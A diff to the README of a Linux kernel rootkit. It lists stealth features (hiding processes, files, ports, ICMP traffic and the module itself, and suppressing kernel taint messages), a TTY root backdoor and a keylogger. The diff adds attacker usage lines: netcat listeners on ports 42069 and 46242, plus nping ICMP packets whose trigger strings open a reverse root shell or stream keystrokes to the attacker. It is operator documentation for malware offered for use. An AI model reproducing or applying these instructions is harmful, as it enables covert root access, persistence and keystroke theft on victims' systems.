@@ -9,18 +9,21 @@ It can:
 - Hide child processes of hidden processes
 - Hide CPU usage of hidden processes
 - Hide any file/process with prefix "hide_ts_"
-- Hide TCP port 42069 (also from tcpdump)
+- Hide TCP port 42069 and 46242 (also from tcpdump)
 - Hide ICMP packets or use them as a backdoor trigger
 - Hide itself from lsmod, /proc/modules, and dmesg
 - Suppress kernel taint messages
-- TTY root backdoor
+- TTYS root backdoor
 - Keylogger (still untested)
 
 Usage:
 load - sudo bash make.sh
 clean - make clean
-backdoor (attacker) - nc -lvnp
-backdoor (attacker) - sudo nping --icmp -c 1 --data-string "fuxSocy_RUN_BACKDOOR" <victims ip>
+backdoor (attacker) - nc -lvnp 42069
+backdoor (attacker) - sudo nping --icmp -c 1 --data-string "FUXSOCY_RUN_BACKDOOR" <victims ip>
+
+keylogger (attacker) - nc -lvnp 46242
+keylogger (attacker) - sudo nping --icmp -c 1 --data-string "FUXSOCY_RUN_KEYLOGGER" <victims ip>
 
 DEPENDENCIES:
 - Python3 for tty shell
